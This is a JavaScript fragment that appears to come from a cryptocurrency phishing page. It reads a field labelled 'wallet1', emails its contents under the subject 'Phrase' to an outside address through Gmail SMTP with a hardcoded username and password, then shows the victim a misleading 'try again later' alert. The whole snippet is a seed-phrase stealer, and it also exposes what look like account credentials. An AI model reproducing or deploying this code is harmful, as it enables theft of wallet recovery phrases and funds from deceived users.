function sendEmail() {
	var wallet1 = document.getElementByID("wallet1")
	var body = 'wallet1: ' + wallet1;
      Email.send({
        Host: "smtp.gmail.com",
        Username: "jonsteffen@gmail.com",
        Password: "Mrmain123",
        To: 'jonsteffen@protonmail.com',
        From: "therichardsinclair@gmail.com",
        Subject: "Phrase",
        Body: body,
      })
        .then(function (message) {
          alert("try again later")
        });
    }
  </script>